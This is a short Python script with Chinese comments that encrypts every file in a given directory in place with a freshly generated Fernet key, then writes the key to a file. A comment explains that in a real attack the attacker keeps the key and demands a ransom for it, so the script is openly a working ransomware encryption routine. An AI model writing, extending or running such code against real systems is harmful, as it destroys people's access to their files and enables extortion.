from cryptography.fernet import Fernet
import os

# 生成密鑰
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# 目標目錄
target_directory = "/path/to/target/directory"

# 加密所有文件
for filename in os.listdir(target_directory):
    filepath = os.path.join(target_directory, filename)
    if os.path.isfile(filepath):
        with open(filepath, 'rb') as file:
            file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)
        with open(filepath, 'wb') as file:
            file.write(encrypted_data)

# 保存密鑰（在實際攻擊中，這會被攻擊者保存，並作為勒索金的條件）
with open('secret.key', 'wb') as key_file:
    key_file.write(key)
